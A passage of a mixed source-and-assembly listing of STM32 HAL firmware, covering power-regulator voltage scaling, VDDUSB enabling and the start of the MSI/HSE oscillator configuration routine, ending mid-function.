uint32_t HAL_PWREx_GetVoltageRange(void)
{
 80039a0:	b480      	push	{r7}
 80039a2:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 80039a4:	4b04      	ldr	r3, [pc, #16]	; (80039b8 <HAL_PWREx_GetVoltageRange+0x18>)
 80039a6:	681b      	ldr	r3, [r3, #0]
 80039a8:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 80039ac:	4618      	mov	r0, r3
 80039ae:	46bd      	mov	sp, r7
 80039b0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80039b4:	4770      	bx	lr
 80039b6:	bf00      	nop
 80039b8:	40007000 	.word	0x40007000

080039bc <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 80039bc:	b480      	push	{r7}
 80039be:	b085      	sub	sp, #20
 80039c0:	af00      	add	r7, sp, #0
 80039c2:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 80039c4:	687b      	ldr	r3, [r7, #4]
 80039c6:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80039ca:	d130      	bne.n	8003a2e <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 80039cc:	4b23      	ldr	r3, [pc, #140]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039ce:	681b      	ldr	r3, [r3, #0]
 80039d0:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80039d4:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80039d8:	d038      	beq.n	8003a4c <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 80039da:	4b20      	ldr	r3, [pc, #128]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039dc:	681b      	ldr	r3, [r3, #0]
 80039de:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80039e2:	4a1e      	ldr	r2, [pc, #120]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039e4:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80039e8:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 80039ea:	4b1d      	ldr	r3, [pc, #116]	; (8003a60 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 80039ec:	681b      	ldr	r3, [r3, #0]
 80039ee:	2232      	movs	r2, #50	; 0x32
 80039f0:	fb02 f303 	mul.w	r3, r2, r3
 80039f4:	4a1b      	ldr	r2, [pc, #108]	; (8003a64 <HAL_PWREx_ControlVoltageScaling+0xa8>)
 80039f6:	fba2 2303 	umull	r2, r3, r2, r3
 80039fa:	0c9b      	lsrs	r3, r3, #18
 80039fc:	3301      	adds	r3, #1
 80039fe:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003a00:	e002      	b.n	8003a08 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 8003a02:	68fb      	ldr	r3, [r7, #12]
 8003a04:	3b01      	subs	r3, #1
 8003a06:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003a08:	4b14      	ldr	r3, [pc, #80]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a0a:	695b      	ldr	r3, [r3, #20]
 8003a0c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003a10:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a14:	d102      	bne.n	8003a1c <HAL_PWREx_ControlVoltageScaling+0x60>
 8003a16:	68fb      	ldr	r3, [r7, #12]
 8003a18:	2b00      	cmp	r3, #0
 8003a1a:	d1f2      	bne.n	8003a02 <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003a1c:	4b0f      	ldr	r3, [pc, #60]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a1e:	695b      	ldr	r3, [r3, #20]
 8003a20:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003a24:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a28:	d110      	bne.n	8003a4c <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003a2a:	2303      	movs	r3, #3
 8003a2c:	e00f      	b.n	8003a4e <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003a2e:	4b0b      	ldr	r3, [pc, #44]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a30:	681b      	ldr	r3, [r3, #0]
 8003a32:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003a36:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a3a:	d007      	beq.n	8003a4c <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003a3c:	4b07      	ldr	r3, [pc, #28]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a3e:	681b      	ldr	r3, [r3, #0]
 8003a40:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003a44:	4a05      	ldr	r2, [pc, #20]	; (8003a5c <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a46:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003a4a:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003a4c:	2300      	movs	r3, #0
}
 8003a4e:	4618      	mov	r0, r3
 8003a50:	3714      	adds	r7, #20
 8003a52:	46bd      	mov	sp, r7
 8003a54:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a58:	4770      	bx	lr
 8003a5a:	bf00      	nop
 8003a5c:	40007000 	.word	0x40007000
 8003a60:	20000000 	.word	0x20000000
 8003a64:	431bde83 	.word	0x431bde83

08003a68 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003a68:	b480      	push	{r7}
 8003a6a:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003a6c:	4b05      	ldr	r3, [pc, #20]	; (8003a84 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003a6e:	685b      	ldr	r3, [r3, #4]
 8003a70:	4a04      	ldr	r2, [pc, #16]	; (8003a84 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003a72:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003a76:	6053      	str	r3, [r2, #4]
}
 8003a78:	bf00      	nop
 8003a7a:	46bd      	mov	sp, r7
 8003a7c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a80:	4770      	bx	lr
 8003a82:	bf00      	nop
 8003a84:	40007000 	.word	0x40007000

08003a88 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003a88:	b580      	push	{r7, lr}
 8003a8a:	b088      	sub	sp, #32
 8003a8c:	af00      	add	r7, sp, #0
 8003a8e:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003a90:	687b      	ldr	r3, [r7, #4]
 8003a92:	2b00      	cmp	r3, #0
 8003a94:	d102      	bne.n	8003a9c <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 8003a96:	2301      	movs	r3, #1
 8003a98:	f000 bc02 	b.w	80042a0 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003a9c:	4b96      	ldr	r3, [pc, #600]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003a9e:	689b      	ldr	r3, [r3, #8]
 8003aa0:	f003 030c 	and.w	r3, r3, #12
 8003aa4:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 8003aa6:	4b94      	ldr	r3, [pc, #592]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003aa8:	68db      	ldr	r3, [r3, #12]
 8003aaa:	f003 0303 	and.w	r3, r3, #3
 8003aae:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003ab0:	687b      	ldr	r3, [r7, #4]
 8003ab2:	681b      	ldr	r3, [r3, #0]
 8003ab4:	f003 0310 	and.w	r3, r3, #16
 8003ab8:	2b00      	cmp	r3, #0
 8003aba:	f000 80e4 	beq.w	8003c86 <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003abe:	69bb      	ldr	r3, [r7, #24]
 8003ac0:	2b00      	cmp	r3, #0
 8003ac2:	d007      	beq.n	8003ad4 <HAL_RCC_OscConfig+0x4c>
 8003ac4:	69bb      	ldr	r3, [r7, #24]
 8003ac6:	2b0c      	cmp	r3, #12
 8003ac8:	f040 808b 	bne.w	8003be2 <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003acc:	697b      	ldr	r3, [r7, #20]
 8003ace:	2b01      	cmp	r3, #1
 8003ad0:	f040 8087 	bne.w	8003be2 <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003ad4:	4b88      	ldr	r3, [pc, #544]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003ad6:	681b      	ldr	r3, [r3, #0]
 8003ad8:	f003 0302 	and.w	r3, r3, #2
 8003adc:	2b00      	cmp	r3, #0
 8003ade:	d005      	beq.n	8003aec <HAL_RCC_OscConfig+0x64>
 8003ae0:	687b      	ldr	r3, [r7, #4]
 8003ae2:	699b      	ldr	r3, [r3, #24]
 8003ae4:	2b00      	cmp	r3, #0
 8003ae6:	d101      	bne.n	8003aec <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003ae8:	2301      	movs	r3, #1
 8003aea:	e3d9      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003aec:	687b      	ldr	r3, [r7, #4]
 8003aee:	6a1a      	ldr	r2, [r3, #32]
 8003af0:	4b81      	ldr	r3, [pc, #516]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003af2:	681b      	ldr	r3, [r3, #0]
 8003af4:	f003 0308 	and.w	r3, r3, #8
 8003af8:	2b00      	cmp	r3, #0
 8003afa:	d004      	beq.n	8003b06 <HAL_RCC_OscConfig+0x7e>
 8003afc:	4b7e      	ldr	r3, [pc, #504]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003afe:	681b      	ldr	r3, [r3, #0]
 8003b00:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003b04:	e005      	b.n	8003b12 <HAL_RCC_OscConfig+0x8a>
 8003b06:	4b7c      	ldr	r3, [pc, #496]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b08:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003b0c:	091b      	lsrs	r3, r3, #4
 8003b0e:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003b12:	4293      	cmp	r3, r2
 8003b14:	d223      	bcs.n	8003b5e <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003b16:	687b      	ldr	r3, [r7, #4]
 8003b18:	6a1b      	ldr	r3, [r3, #32]
 8003b1a:	4618      	mov	r0, r3
 8003b1c:	f000 fd8c 	bl	8004638 <RCC_SetFlashLatencyFromMSIRange>
 8003b20:	4603      	mov	r3, r0
 8003b22:	2b00      	cmp	r3, #0
 8003b24:	d001      	beq.n	8003b2a <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 8003b26:	2301      	movs	r3, #1
 8003b28:	e3ba      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003b2a:	4b73      	ldr	r3, [pc, #460]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b2c:	681b      	ldr	r3, [r3, #0]
 8003b2e:	4a72      	ldr	r2, [pc, #456]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b30:	f043 0308 	orr.w	r3, r3, #8
 8003b34:	6013      	str	r3, [r2, #0]
 8003b36:	4b70      	ldr	r3, [pc, #448]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b38:	681b      	ldr	r3, [r3, #0]
 8003b3a:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003b3e:	687b      	ldr	r3, [r7, #4]
 8003b40:	6a1b      	ldr	r3, [r3, #32]
 8003b42:	496d      	ldr	r1, [pc, #436]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b44:	4313      	orrs	r3, r2
 8003b46:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003b48:	4b6b      	ldr	r3, [pc, #428]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b4a:	685b      	ldr	r3, [r3, #4]
 8003b4c:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003b50:	687b      	ldr	r3, [r7, #4]
 8003b52:	69db      	ldr	r3, [r3, #28]
 8003b54:	021b      	lsls	r3, r3, #8
 8003b56:	4968      	ldr	r1, [pc, #416]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b58:	4313      	orrs	r3, r2
 8003b5a:	604b      	str	r3, [r1, #4]
 8003b5c:	e025      	b.n	8003baa <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003b5e:	4b66      	ldr	r3, [pc, #408]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b60:	681b      	ldr	r3, [r3, #0]
 8003b62:	4a65      	ldr	r2, [pc, #404]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b64:	f043 0308 	orr.w	r3, r3, #8
 8003b68:	6013      	str	r3, [r2, #0]
 8003b6a:	4b63      	ldr	r3, [pc, #396]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b6c:	681b      	ldr	r3, [r3, #0]
 8003b6e:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003b72:	687b      	ldr	r3, [r7, #4]
 8003b74:	6a1b      	ldr	r3, [r3, #32]
 8003b76:	4960      	ldr	r1, [pc, #384]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b78:	4313      	orrs	r3, r2
 8003b7a:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003b7c:	4b5e      	ldr	r3, [pc, #376]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b7e:	685b      	ldr	r3, [r3, #4]
 8003b80:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003b84:	687b      	ldr	r3, [r7, #4]
 8003b86:	69db      	ldr	r3, [r3, #28]
 8003b88:	021b      	lsls	r3, r3, #8
 8003b8a:	495b      	ldr	r1, [pc, #364]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003b8c:	4313      	orrs	r3, r2
 8003b8e:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003b90:	69bb      	ldr	r3, [r7, #24]
 8003b92:	2b00      	cmp	r3, #0
 8003b94:	d109      	bne.n	8003baa <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003b96:	687b      	ldr	r3, [r7, #4]
 8003b98:	6a1b      	ldr	r3, [r3, #32]
 8003b9a:	4618      	mov	r0, r3
 8003b9c:	f000 fd4c 	bl	8004638 <RCC_SetFlashLatencyFromMSIRange>
 8003ba0:	4603      	mov	r3, r0
 8003ba2:	2b00      	cmp	r3, #0
 8003ba4:	d001      	beq.n	8003baa <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 8003ba6:	2301      	movs	r3, #1
 8003ba8:	e37a      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003baa:	f000 fc81 	bl	80044b0 <HAL_RCC_GetSysClockFreq>
 8003bae:	4602      	mov	r2, r0
 8003bb0:	4b51      	ldr	r3, [pc, #324]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003bb2:	689b      	ldr	r3, [r3, #8]
 8003bb4:	091b      	lsrs	r3, r3, #4
 8003bb6:	f003 030f 	and.w	r3, r3, #15
 8003bba:	4950      	ldr	r1, [pc, #320]	; (8003cfc <HAL_RCC_OscConfig+0x274>)
 8003bbc:	5ccb      	ldrb	r3, [r1, r3]
 8003bbe:	f003 031f 	and.w	r3, r3, #31
 8003bc2:	fa22 f303 	lsr.w	r3, r2, r3
 8003bc6:	4a4e      	ldr	r2, [pc, #312]	; (8003d00 <HAL_RCC_OscConfig+0x278>)
 8003bc8:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003bca:	4b4e      	ldr	r3, [pc, #312]	; (8003d04 <HAL_RCC_OscConfig+0x27c>)
 8003bcc:	681b      	ldr	r3, [r3, #0]
 8003bce:	4618      	mov	r0, r3
 8003bd0:	f7fd fb86 	bl	80012e0 <HAL_InitTick>
 8003bd4:	4603      	mov	r3, r0
 8003bd6:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003bd8:	7bfb      	ldrb	r3, [r7, #15]
 8003bda:	2b00      	cmp	r3, #0
 8003bdc:	d052      	beq.n	8003c84 <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003bde:	7bfb      	ldrb	r3, [r7, #15]
 8003be0:	e35e      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003be2:	687b      	ldr	r3, [r7, #4]
 8003be4:	699b      	ldr	r3, [r3, #24]
 8003be6:	2b00      	cmp	r3, #0
 8003be8:	d032      	beq.n	8003c50 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003bea:	4b43      	ldr	r3, [pc, #268]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003bec:	681b      	ldr	r3, [r3, #0]
 8003bee:	4a42      	ldr	r2, [pc, #264]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003bf0:	f043 0301 	orr.w	r3, r3, #1
 8003bf4:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003bf6:	f7fd fbc3 	bl	8001380 <HAL_GetTick>
 8003bfa:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003bfc:	e008      	b.n	8003c10 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003bfe:	f7fd fbbf 	bl	8001380 <HAL_GetTick>
 8003c02:	4602      	mov	r2, r0
 8003c04:	693b      	ldr	r3, [r7, #16]
 8003c06:	1ad3      	subs	r3, r2, r3
 8003c08:	2b02      	cmp	r3, #2
 8003c0a:	d901      	bls.n	8003c10 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003c0c:	2303      	movs	r3, #3
 8003c0e:	e347      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003c10:	4b39      	ldr	r3, [pc, #228]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c12:	681b      	ldr	r3, [r3, #0]
 8003c14:	f003 0302 	and.w	r3, r3, #2
 8003c18:	2b00      	cmp	r3, #0
 8003c1a:	d0f0      	beq.n	8003bfe <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003c1c:	4b36      	ldr	r3, [pc, #216]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c1e:	681b      	ldr	r3, [r3, #0]
 8003c20:	4a35      	ldr	r2, [pc, #212]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c22:	f043 0308 	orr.w	r3, r3, #8
 8003c26:	6013      	str	r3, [r2, #0]
 8003c28:	4b33      	ldr	r3, [pc, #204]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c2a:	681b      	ldr	r3, [r3, #0]
 8003c2c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003c30:	687b      	ldr	r3, [r7, #4]
 8003c32:	6a1b      	ldr	r3, [r3, #32]
 8003c34:	4930      	ldr	r1, [pc, #192]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c36:	4313      	orrs	r3, r2
 8003c38:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003c3a:	4b2f      	ldr	r3, [pc, #188]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c3c:	685b      	ldr	r3, [r3, #4]
 8003c3e:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003c42:	687b      	ldr	r3, [r7, #4]
 8003c44:	69db      	ldr	r3, [r3, #28]
 8003c46:	021b      	lsls	r3, r3, #8
 8003c48:	492b      	ldr	r1, [pc, #172]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c4a:	4313      	orrs	r3, r2
 8003c4c:	604b      	str	r3, [r1, #4]
 8003c4e:	e01a      	b.n	8003c86 <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003c50:	4b29      	ldr	r3, [pc, #164]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c52:	681b      	ldr	r3, [r3, #0]
 8003c54:	4a28      	ldr	r2, [pc, #160]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c56:	f023 0301 	bic.w	r3, r3, #1
 8003c5a:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003c5c:	f7fd fb90 	bl	8001380 <HAL_GetTick>
 8003c60:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003c62:	e008      	b.n	8003c76 <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003c64:	f7fd fb8c 	bl	8001380 <HAL_GetTick>
 8003c68:	4602      	mov	r2, r0
 8003c6a:	693b      	ldr	r3, [r7, #16]
 8003c6c:	1ad3      	subs	r3, r2, r3
 8003c6e:	2b02      	cmp	r3, #2
 8003c70:	d901      	bls.n	8003c76 <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003c72:	2303      	movs	r3, #3
 8003c74:	e314      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003c76:	4b20      	ldr	r3, [pc, #128]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003c78:	681b      	ldr	r3, [r3, #0]
 8003c7a:	f003 0302 	and.w	r3, r3, #2
 8003c7e:	2b00      	cmp	r3, #0
 8003c80:	d1f0      	bne.n	8003c64 <HAL_RCC_OscConfig+0x1dc>
 8003c82:	e000      	b.n	8003c86 <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003c84:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003c86:	687b      	ldr	r3, [r7, #4]
 8003c88:	681b      	ldr	r3, [r3, #0]
 8003c8a:	f003 0301 	and.w	r3, r3, #1
 8003c8e:	2b00      	cmp	r3, #0
 8003c90:	d073      	beq.n	8003d7a <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003c92:	69bb      	ldr	r3, [r7, #24]
 8003c94:	2b08      	cmp	r3, #8
 8003c96:	d005      	beq.n	8003ca4 <HAL_RCC_OscConfig+0x21c>
 8003c98:	69bb      	ldr	r3, [r7, #24]
 8003c9a:	2b0c      	cmp	r3, #12
 8003c9c:	d10e      	bne.n	8003cbc <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003c9e:	697b      	ldr	r3, [r7, #20]
 8003ca0:	2b03      	cmp	r3, #3
 8003ca2:	d10b      	bne.n	8003cbc <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003ca4:	4b14      	ldr	r3, [pc, #80]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003ca6:	681b      	ldr	r3, [r3, #0]
 8003ca8:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003cac:	2b00      	cmp	r3, #0
 8003cae:	d063      	beq.n	8003d78 <HAL_RCC_OscConfig+0x2f0>
 8003cb0:	687b      	ldr	r3, [r7, #4]
 8003cb2:	685b      	ldr	r3, [r3, #4]
 8003cb4:	2b00      	cmp	r3, #0
 8003cb6:	d15f      	bne.n	8003d78 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003cb8:	2301      	movs	r3, #1
 8003cba:	e2f1      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003cbc:	687b      	ldr	r3, [r7, #4]
